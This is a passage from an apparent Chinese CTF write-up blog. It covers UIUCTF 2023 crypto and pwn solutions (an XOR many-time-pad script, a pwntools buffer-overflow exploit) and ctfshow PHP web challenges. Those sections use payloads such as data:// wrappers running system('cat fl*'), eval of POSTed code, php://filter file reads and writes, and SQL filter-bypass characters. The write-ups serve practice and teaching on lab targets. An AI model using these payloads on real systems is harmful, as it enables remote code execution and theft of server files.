class=\"keyword\">in</span> string.printable <span class=\"keyword\">and</span> char.isalpha(): counter[indexOfChar] += <span class=\"number\">1</span> <span class=\"comment\"># Increment the counter at this index</span></span><br><span class=\"line\">\tknownSpaceIndexes = []</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># Loop through all positions where a space character was possible in the current_index cipher</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> ind, val <span class=\"keyword\">in</span> counter.items():</span><br><span class=\"line\">\t\t<span class=\"comment\"># If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> val &gt;= <span class=\"number\">7</span>: knownSpaceIndexes.append(ind)</span><br><span class=\"line\">\t<span class=\"comment\">#print knownSpaceIndexes # Shows all the positions where we now know the key!</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span></span><br><span class=\"line\">\txor_with_spaces = strxor(ciphertext.decode(<span class=\"string\">&#x27;hex&#x27;</span>),<span class=\"string\">&#x27; &#x27;</span>*<span class=\"number\">150</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> index <span class=\"keyword\">in</span> knownSpaceIndexes:</span><br><span class=\"line\">\t\t<span class=\"comment\"># Store the key&#x27;s value at the correct position</span></span><br><span class=\"line\">\t\tfinal_key[index] = xor_with_spaces[index].encode(<span class=\"string\">&#x27;hex&#x27;</span>)</span><br><span class=\"line\">\t\t<span class=\"comment\"># Record that we known the key at this position</span></span><br><span class=\"line\">\t\tknown_key_positions.add(index)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Construct a hex key from the currently known key, adding in &#x27;00&#x27; hex chars where we do not know (to make a complete hex string)</span></span><br><span class=\"line\">final_key_hex = <span class=\"string\">&#x27;&#x27;</span>.join([val <span class=\"keyword\">if</span> val <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span> <span class=\"keyword\">else</span> <span class=\"string\">&#x27;00&#x27;</span> <span class=\"keyword\">for</span> val <span class=\"keyword\">in</span> final_key])</span><br><span class=\"line\"><span class=\"comment\"># Xor the currently known key with the target cipher</span></span><br><span class=\"line\">output = strxor(target_cipher.decode(<span class=\"string\">&#x27;hex&#x27;</span>),final_key_hex.decode(<span class=\"string\">&#x27;hex&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;Fix this sentence:&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&#x27;&#x27;</span>.join([char <span class=\"keyword\">if</span> index <span class=\"keyword\">in</span> known_key_positions <span class=\"keyword\">else</span> <span class=\"string\">&#x27;*&#x27;</span> <span class=\"keyword\">for</span> index, char <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(output)])+<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># WAIT.. MANUAL STEP HERE </span></span><br><span class=\"line\"><span class=\"comment\"># This output are printing a * if that character is not known yet</span></span><br><span class=\"line\"><span class=\"comment\"># fix the missing characters like this: &quot;Let*M**k*ow if *o&#123;*a&quot; = &quot;cure, Let Me know if you a&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># if is too hard, change the target_cipher to another one and try again</span></span><br><span class=\"line\"><span class=\"comment\"># and we have our key to fix the entire text!</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sys.exit(0) #comment and continue if u got a good key</span></span><br><span class=\"line\"></span><br><span class=\"line\">target_plaintext = <span class=\"string\">&quot;printed on flammable material so that spies could&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;Fixed:&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> target_plaintext+<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">key = strxor(target_cipher.decode(<span class=\"string\">&#x27;hex&#x27;</span>),target_plaintext)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;Decrypted msg:&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> cipher <span class=\"keyword\">in</span> ciphers:</span><br><span class=\"line\">\t<span class=\"built_in\">print</span> strxor(cipher.decode(<span class=\"string\">&#x27;hex&#x27;</span>),key)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;\\nPrivate key recovered: &quot;</span>+key+<span class=\"string\">&quot;\\n&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>运行得到flag</p>\n<h2 id=\"At-Home\"><a href=\"#At-Home\" class=\"headerlink\" title=\"At Home\"></a>At Home</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#chal.py</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> getRandomNBitInteger</span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"built_in\">int</span>.from_bytes(<span class=\"string\">b&quot;uiuctf&#123;******************&#125;&quot;</span>, <span class=\"string\">&quot;big&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">a = getRandomNBitInteger(<span class=\"number\">256</span>)</span><br><span class=\"line\">b = getRandomNBitInteger(<span class=\"number\">256</span>)</span><br><span class=\"line\">a_ = getRandomNBitInteger(<span class=\"number\">256</span>)</span><br><span class=\"line\">b_ = getRandomNBitInteger(<span class=\"number\">256</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">M = a * b - <span class=\"number\">1</span></span><br><span class=\"line\">e = a_ * M + a</span><br><span class=\"line\">d = b_ * M + b</span><br><span class=\"line\"></span><br><span class=\"line\">n = (e * d - <span class=\"number\">1</span>) // M</span><br><span class=\"line\"></span><br><span class=\"line\">c = (flag * e) % n</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;<span class=\"subst\">&#123;e = &#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;<span class=\"subst\">&#123;n = &#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;<span class=\"subst\">&#123;c = &#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">e = 359050389152821553416139581503505347057925208560451864426634100333116560422313639260283981496824920089789497818520105189684311823250795520058111763310428202654439351922361722731557743640799254622423104811120692862884666323623693713</span><br><span class=\"line\">n = 26866112476805004406608209986673337296216833710860089901238432952384811714684404001885354052039112340209557226256650661186843726925958125334974412111471244462419577294051744141817411512295364953687829707132828973068538495834511391553765427956458757286710053986810998890293154443240352924460801124219510584689</span><br><span class=\"line\">c = 67743374462448582107440168513687520434594529331821740737396116407928111043815084665002104196754020530469360539253323738935708414363005373458782041955450278954348306401542374309788938720659206881893349940765268153223129964864641817170395527170138553388816095842842667443210645457879043383345869</span><br></pre></td></tr></table></figure>\n\n<p>通过c=(flag*e)%n可得</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">c = (flag * e) % n</span><br><span class=\"line\">c * e^-1 = (flag * e * e^-1) % n</span><br><span class=\"line\">c * e^-1 = flag % n</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\">e = <span class=\"number\">359050389152821553416139581503505347057925208560451864426634100333116560422313639260283981496824920089789497818520105189684311823250795520058111763310428202654439351922361722731557743640799254622423104811120692862884666323623693713</span></span><br><span class=\"line\">n = <span class=\"number\">26866112476805004406608209986673337296216833710860089901238432952384811714684404001885354052039112340209557226256650661186843726925958125334974412111471244462419577294051744141817411512295364953687829707132828973068538495834511391553765427956458757286710053986810998890293154443240352924460801124219510584689</span></span><br><span class=\"line\">c = <span class=\"number\">67743374462448582107440168513687520434594529331821740737396116407928111043815084665002104196754020530469360539253323738935708414363005373458782041955450278954348306401542374309788938720659206881893349940765268153223129964864641817170395527170138553388816095842842667443210645457879043383345869</span></span><br><span class=\"line\">d=inverse(e,n)</span><br><span class=\"line\">flag=(c*d)%n</span><br><span class=\"line\"><span class=\"built_in\">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h1><h2 id=\"Chainmail\"><a href=\"#Chainmail\" class=\"headerlink\" title=\"Chainmail\"></a>Chainmail</h2><p>一个基础的栈溢出，跳到give_flag的函数即可，但要注意的是在发送give_flag的地址之前要再给他发送一个<code>ret</code>的地址，否则会造成错误的对齐。<code>ret</code>的地址可以用<code>ROPgadget </code>找，命令:<code>ROPgadget --binary chal --only  &#39;ret&#39;</code>。</p>\n<p>exp：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">a = remote(<span class=\"string\">&quot;chainmail.chal.uiuc.tf&quot;</span>, <span class=\"number\">1337</span>)</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">72</span> +p64(<span class=\"number\">0x40101a</span>) + p64(<span class=\"number\">0x401216</span>)</span><br><span class=\"line\">a.sendline(payload)</span><br><span class=\"line\">a.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h1><h2 id=\"peanut-xss\"><a href=\"#peanut-xss\" class=\"headerlink\" title=\"peanut-xss\"></a>peanut-xss</h2><p>XSS学的不是很好，具体怎么解可以看下面的文章:</p>\n<p><a href=\"https://hackmd.io/@Solderet/UIUCTF-2023-peanut-xss\">https://hackmd.io/@Solderet/UIUCTF-2023-peanut-xss</a></p>\n","categories":["ctf"],"tags":["ctf"]},{"title":"chtshow web入门37~40","url":"/2023/01/11/chtshow37-40/","content":"<h1 id=\"web-37\"><a href=\"#web-37\" class=\"headerlink\" title=\"web 37\"></a>web 37</h1><p><img src=\"/pic/web37.png\" alt=\"img\"><br>考察data伪协议，data伪协议需满足allow_url_fopen，allow_url_include同时开启才能使用。<br>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=data://text/plain,&lt;?php system(&quot;cat fl*&quot;);?&gt;</span><br></pre></td></tr></table></figure>\n<h1 id=\"web38\"><a href=\"#web38\" class=\"headerlink\" title=\"web38\"></a>web38</h1><p><img src=\"/pic/web38.png\" alt=\"img\"><br>php被过滤了，可以用短标签绕过php。<br>短标签：比<?php ?>更灵活调用的方法  <? /*程序操作*/ ?>  <?=/*函数*/?><br>paylaod：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?c=data://text/plain,&lt;?=`cat fla*`;?&gt;</span><br><span class=\"line\">/?c=data://text/plain,&lt;?=system(&quot;cat fl*&quot;);?&gt;</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h1 id=\"web39\"><a href=\"#web39\" class=\"headerlink\" title=\"web39\"></a>web39</h1><p>include中多了个.php，但是上一题的payload也管用，看别人的wp说是有?&gt;结尾进行闭合，所以没有影响。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;)?&gt;</span><br></pre></td></tr></table></figure>\n<h1 id=\"web40\"><a href=\"#web40\" class=\"headerlink\" title=\"web40\"></a>web40</h1><p><img src=\"/pic/web40.png\" alt=\"img\"><br>这个过滤了不少东西，但是没有过滤英文字母、下划线和英文的括号。<br>可以用提示的方法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class=\"line\">show_source()函数对文件进行语法高亮显示</span><br><span class=\"line\">next() 函数将内部指针指向数组中的下一个元素，并输出</span><br><span class=\"line\">array_reverse() 函数以相反的元素顺序返回数组</span><br><span class=\"line\">scandir() 函数返回指定目录中的文件和目录的数组</span><br><span class=\"line\">pos() 函数返回数组中的当前元素的值</span><br><span class=\"line\">localeconv() 函数返回一包含本地数字及货币格式信息的数组</span><br></pre></td></tr></table></figure>\n<p>也可以换其他方法<br>首先</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=print_r(get_defined_vars());</span><br></pre></td></tr></table></figure>\n<p>获得一下信息<br><img src=\"/pic/web40.1.png\" alt=\"img\"><br>使用next获取这个数组的下一个位置的元素，也就是POST的元素.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=print_r(next(get_defined_vars()));</span><br></pre></td></tr></table></figure>\n<p><img src=\"/pic/web40.2.png\" alt=\"img\"><br>然后把这个元素弹出，用array_pop</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=print_r(array_pop(next(get_defined_vars())));</span><br></pre></td></tr></table></figure>\n<p><img src=\"/pic/web40.3.png\" alt=\"img\"><br>最后再用eval执行一下就可以了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=eval(array_pop(next(get_defined_vars())));</span><br></pre></td></tr></table></figure>\n<p>POST数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1=system(&quot;cat flag.php&quot;);或1=echo`cat flag.php`;</span><br></pre></td></tr></table></figure>\n<p>关于echo、print、print_r的区别可以参考：<a href=\"https://blog.51cto.com/zlong37/1556855\">https://blog.51cto.com/zlong37/1556855</a></p>\n<h1 id=\"常用的注释符\"><a href=\"#常用的注释符\" class=\"headerlink\" title=\"常用的注释符\"></a>常用的注释符</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#、--、-- -、//、/**/、/*letmetest*/、;%00</span><br></pre></td></tr></table></figure>\n<h1 id=\"MySQL中可以代替空格的字符\"><a href=\"#MySQL中可以代替空格的字符\" class=\"headerlink\" title=\"MySQL中可以代替空格的字符\"></a>MySQL中可以代替空格的字符</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/**/、()、=、%20、%09、%0a、0x0a、0x0b、0x0c、0x0d、+、-、~、.等等</span><br></pre></td></tr></table></figure>","categories":["web","ctfshow","刷题"],"tags":["ctfshow","刷题","web"]},{"title":"ctfshow web入门101~104","url":"/2023/02/18/ctfshow-web%E5%85%A5%E9%97%A8101~104/","content":"<h1 id=\"web101\"><a href=\"#web101\" class=\"headerlink\" title=\"web101\"></a>web101</h1><p><img src=\"/pic/101.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">当新建ReflectionClass类并传入PHP代码时，会返回代码的运行结果，可以通过echo显示</span><br><span class=\"line\">即使传入了空的括号，代码依旧可以运行，且error_reporting(0)的存在阻止了报错</span><br></pre></td></tr></table></figure>\n<p>v1必须是数字，v2可以使用可以使用反射类new ReflectionClass(),v3没有过滤<code>;</code>。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">v1=1&amp;v2=echo new Reflectionclass&amp;v3=;</span><br></pre></td></tr></table></figure>\n<p>0x2d还是-，然后最后一位需要自己猜。</p>\n<h1 id=\"web102\"><a href=\"#web102\" class=\"headerlink\" title=\"web102\"></a>web102</h1><p><img src=\"/pic/102.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">is_numeric() 函数用于检测变量是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回true，否则返回false。如果字符串中含有一个e代表科学计数法，也可返回true</span><br><span class=\"line\"></span><br><span class=\"line\">call_user_func() 函数用于调用方法或者变量，第一个参数是被调用的函数，第二个是调用的函数的参数</span><br><span class=\"line\"></span><br><span class=\"line\">file_put_contents() 函数应该都熟悉了，写入内容到文件中，第一个参数是文件名，第二个参数是内容</span><br></pre></td></tr></table></figure>\n<p>要确保v4为真，就要确保v2是数字.将v2进行base64编码然后再转换成16进制。<br>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=2.php</span><br><span class=\"line\">POST：v1=hex2bin</span><br></pre></td></tr></table></figure>\n<p>然后访问2.php查看源码就能找到flag。</p>\n<h1 id=\"web103\"><a href=\"#web103\" class=\"headerlink\" title=\"web103\"></a>web103</h1><p>找不到服务器，做不了题.</p>\n<h1 id=\"web104\"><a href=\"#web104\" class=\"headerlink\" title=\"web104\"></a>web104</h1><p><img src=\"/pic/104.png\"><br>因为没有判断，可以直接让两个值相等，也可以用数组绕过，也可以用两个相等的sha1的值。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">aaK1STfY</span><br><span class=\"line\">0e76658526655756207688271159624026011393</span><br><span class=\"line\">aaO8zKZF</span><br><span class=\"line\">0e89257456677279068558073954252716165668</span><br></pre></td></tr></table></figure>\n","categories":["ctfshow","刷题","php特性"],"tags":["ctfshow","刷题","php特性"]},{"title":"ctfshow web入门110~125","url":"/2023/03/17/ctfshow-web%E5%85%A5%E9%97%A8110/","content":"<h1 id=\"web110\"><a href=\"#web110\" class=\"headerlink\" title=\"web110\"></a>web110</h1><p><img src=\"/pic/110.png\"><br>考察FilesystemIterator。getcwd()函数 获取当前工作目录 返回当前工作目录。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure>\n<p>缺陷是如果flag的文件不在第一位的话，就不能得到这个文件名。</p>\n<span id=\"more\"></span>\n<h1 id=\"web111\"><a href=\"#web111\" class=\"headerlink\" title=\"web111\"></a>web111</h1><p><img src=\"/pic/111.png\"><br>考察 全局变量GLOBALS<br><img src=\"/pic/111.1.png\"><br>要执行这一段函数，v1要等于ctfshow</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;</span><br><span class=\"line\">            getFlag($v1,$v2);</span><br><span class=\"line\">    &#125; </span><br></pre></td></tr></table></figure>\n<p>然后再将v2的值赋给v1，再接着getFlag函数，打印v1，v1为全局变量的时候，即可打印出flag。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure>\n<h1 id=\"web112\"><a href=\"#web112\" class=\"headerlink\" title=\"web112\"></a>web112</h1><p><img src=\"/pic/112.png\"><br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">php://filter/resource=flag.php</span><br><span class=\"line\">php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br><span class=\"line\">php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br><span class=\"line\">compress.zlib://flag.php</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.csdn.net/qq_44657899/article/details/109300335\">php://filter的各种过滤器</a></p>\n<h1 id=\"web113\"><a href=\"#web113\" class=\"headerlink\" title=\"web113\"></a>web113</h1><p><img src=\"/pic/113.png\"><br>payload:<br>可以用zlib伪协议</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?file=compress.zlib://flag.php</span><br></pre></td></tr></table></figure>\n<p>也可以用/proc/self/root</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p</span><br><span class=\"line\">roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro</span><br><span class=\"line\">c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/</span><br><span class=\"line\">self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se</span><br><span class=\"line\">lf/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.csdn.net/cosmoslin/article/details/122660083\">proc目录的应用</a><br><img src=\"/pic/114.png\"><br>compress，和非预期都被禁了，但是伪协议放出来了，可以直接使用伪协议读<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>\n<h1 id=\"web115\"><a href=\"#web115\" class=\"headerlink\" title=\"web115\"></a>web115</h1><p><img src=\"/pic/115.png\"><br>考察点：trim函数的绕过+is_numeric绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">语法</span><br><span class=\"line\">trim(string,charlist)</span><br><span class=\"line\"></span><br><span class=\"line\">参数\t描述</span><br><span class=\"line\">string\t        必需。规定要检查的字符串。</span><br><span class=\"line\">charlist\t    可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;\\0&quot;       - NULL</span><br><span class=\"line\">&quot;\\t&quot;       - 制表符</span><br><span class=\"line\">&quot;\\n&quot;       - 换行</span><br><span class=\"line\">&quot;\\x0B&quot;     - 垂直制表符</span><br><span class=\"line\">&quot;\\r&quot;       - 回车</span><br><span class=\"line\">&quot; &quot;        - 空格</span><br></pre></td></tr></table></figure>\n<p>看师傅的wp才能做出来，在本地测试一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">for($i=0;$i&lt;=128;$i++)&#123;</span><br><span class=\"line\">    $str=chr($i).&quot;1&quot;;</span><br><span class=\"line\">    if(is_numeric($str)&amp;&amp; trim($str)!==&#x27;1&#x27;)&#123;</span><br><span class=\"line\">        echo urlencode(chr($i)).&quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以用%0c换页，<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?num=%0c36</span><br></pre></td></tr></table></figure>\n<h1 id=\"web123\"><a href=\"#web123\" class=\"headerlink\" title=\"web123\"></a>web123</h1><p><img src=\"/pic/123.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET或POST的方式传进去的变量名，会自动将空格 + . [ 转换为_,想构造出.，需要前面带上[，后面用.就可以不变成_。</span><br></pre></td></tr></table></figure>\n\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</span><br></pre></td></tr></table></figure>\n<h1 id=\"web125\"><a href=\"#web125\" class=\"headerlink\" title=\"web125\"></a>web125</h1><p><img src=\"/pic/125.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1、cli模式（命令行）下</span><br><span class=\"line\"></span><br><span class=\"line\">\t第一个参数$_SERVER[&#x27;argv&#x27;][0]是脚本名，其余的是传递给脚本的参数</span><br><span class=\"line\"></span><br><span class=\"line\">2、web网页模式下</span><br><span class=\"line\"></span><br><span class=\"line\">\t在web页模式下必须在php.ini开启register_argc_argv配置项</span><br><span class=\"line\">\t</span><br><span class=\"line\">    设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果</span><br><span class=\"line\"></span><br><span class=\"line\">    这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]</span><br><span class=\"line\"></span><br><span class=\"line\">    $argv,$argc在web模式下不适用</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload:</span><br><span class=\"line\">get:  $fl0g=flag_give_me;</span><br><span class=\"line\">post:  CTF_SHOW=1&amp;CTF%5bSHOW.COM=1&amp;fun=eval($a[0])</span><br></pre></td></tr></table></figure>","categories":["ctfshow","刷题","php特性"],"tags":["ctfshow","刷题","php特性"]},{"title":"ctfshow web入门105~109","url":"/2023/02/26/ctfshow-web%E5%85%A5%E9%97%A8105/","content":"<p><img src=\"/pic/105.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class=\"line\">    if($key===&#x27;error&#x27;)&#123;</span><br><span class=\"line\">        die(&quot;what are you doing?!&quot;);</span><br><span class=\"line\">    &#125; </span><br></pre></td></tr></table></figure>\n<p>这一段说get传的值不能等于error。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">foreach($_POST as $key =&gt; $value)&#123;</span><br><span class=\"line\">    if($value===&#x27;flag&#x27;)&#123;</span><br><span class=\"line\">        die(&quot;what are you doing?!&quot;);</span><br><span class=\"line\">    &#125; </span><br></pre></td></tr></table></figure>\n<p>这一段说POST传的值不能等于flag。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;</span><br><span class=\"line\">    die($error);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>这一段说POST传的值不等于flag的话输出变量error。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET:?a=flag</span><br><span class=\"line\">POST:error=a</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h1 id=\"web106\"><a href=\"#web106\" class=\"headerlink\" title=\"web106\"></a>web106</h1><p><img src=\"/pic/106.png\"><br>这道题就比web105多一个比较。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET:v2[]=1</span><br><span class=\"line\">POST:v1[]=2</span><br></pre></td></tr></table></figure>\n<h1 id=\"web107\"><a href=\"#web107\" class=\"headerlink\" title=\"web107\"></a>web107</h1><p><img src=\"/pic/107.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">parse_str(string,array)</span><br><span class=\"line\">把查询字符串解析到变量中。</span><br><span class=\"line\">string必选。规定要解析的字符串</span><br><span class=\"line\">array可选。规定存储变量的数组的名称。</span><br></pre></td></tr></table></figure>\n<p>题目就是把v1的值赋给v2，然后让v2的值和v3的MD5值相同。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET:?v3=a</span><br><span class=\"line\">POST:v1=flag=0cc175b9c0f1b6a831c399e269772661</span><br></pre></td></tr></table></figure>\n<p>MD5没办法处理数组。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET:?v3=a</span><br><span class=\"line\">POST:v1=   #空</span><br></pre></td></tr></table></figure>\n<h1 id=\"web108\"><a href=\"#web108\" class=\"headerlink\" title=\"web108\"></a>web108</h1><p>连接不到服务器…..</p>\n<h1 id=\"web109\"><a href=\"#web109\" class=\"headerlink\" title=\"web109\"></a>web109</h1><p>找不到服务器……</p>\n","categories":["ctfshow","刷题","php特性"],"tags":["ctfshow","刷题","php特性"]},{"title":"ctfshow web入门126~150","url":"/2023/03/18/ctfshow-web%E5%85%A5%E9%97%A8126/","content":"<h1 id=\"web126\"><a href=\"#web126\" class=\"headerlink\" title=\"web126\"></a>web126</h1><p>与web125差不多</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">get: a=1+fl0g=flag_give_me</span><br><span class=\"line\">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br></pre></td></tr></table></figure>\n<h1 id=\"web127\"><a href=\"#web127\" class=\"headerlink\" title=\"web127\"></a>web127</h1><p>绕过方式和web123一样。<br>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?ctf show=ilove36d</span><br></pre></td></tr></table></figure>\n<h1 id=\"web128\"><a href=\"#web128\" class=\"headerlink\" title=\"web128\"></a>web128</h1><p><img src=\"/pic/128.png\"><br>考察点：gettext拓展的使用<br>在开启该拓展后 _() 等效于 gettext()<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure>\n<h1 id=\"web129\"><a href=\"#web129\" class=\"headerlink\" title=\"web129\"></a>web129</h1><p><img src=\"/pic/129.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">stripos(string,find,start)</span><br><span class=\"line\">返回值：返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回FALSE。注释：字符串位置从0开始，不是从1开始</span><br></pre></td></tr></table></figure>\n<p>看别人的wp绕过的姿势有很多啊，但是怎么一到我这里就失灵了啊。只能用php伪协议<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span 